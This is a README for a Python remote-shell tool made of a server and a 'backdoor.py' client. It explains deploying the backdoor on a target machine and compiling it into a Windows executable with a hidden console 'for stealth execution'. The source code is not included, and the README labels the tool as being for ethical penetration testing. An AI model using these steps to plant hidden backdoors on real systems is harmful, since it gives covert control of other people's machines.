# RemoteShell

## Overview
RemoteShell is a simple yet effective remote shell tool designed for secure command execution and file transfers between a **server** and a **client**. It allows a user to remotely interact with a system, execute shell commands, and transfer files.

⚠ **Disclaimer:** This tool is intended for educational and ethical penetration testing purposes. Unauthorized use may violate cybersecurity laws.

## Features
- Remote shell access via TCP connection.
- File upload and download functionality.
- Persistent connection attempts with exponential backoff.
- JSON-based reliable data exchange.
- Configurable IP address and port.

## Installation & Usage

### 1. **Setting Up the Server**
Run `server.py` on the **host machine** to listen for incoming connections:
```bash
python server.py
```
Ensure that the correct **IP address** is set in:
```python
sock.bind(('YOUR_IP', 5555))
```
For local testing, use `0.0.0.0` or `localhost`.

### 2. **Deploying the Backdoor**
Run `backdoor.py` on the **target machine**:
```bash
python backdoor.py
```
The script will continuously attempt to connect to the server and allow remote control.

## Converting `backdoor.py` to `.exe`
To run `backdoor.py` as a standalone executable on **Windows**, use **PyInstaller**.

### Steps to Convert:
1. Install PyInstaller:
   ```bash
   pip install pyinstaller
   ```
2. Convert `backdoor.py` into a Windows executable:
   ```bash
   pyinstaller --onefile --noconsole backdoor.py
   ```
   - `--onefile`: Packages everything into a single executable.
   - `--noconsole`: Hides the console window for stealth execution.

### Alternative Tools for EXE Creation:
- **AutoPy** – Similar functionality for packaging Python scripts.
- **py2exe** – Another tool for creating Windows executables.

## Future Improvements
Possible future enhancements:
- Add encryption for communication.
- Implement multi-client support.
- Enhance error handling and logging.

## License
Distributed under the **MIT License**. Ensure ethical usage.
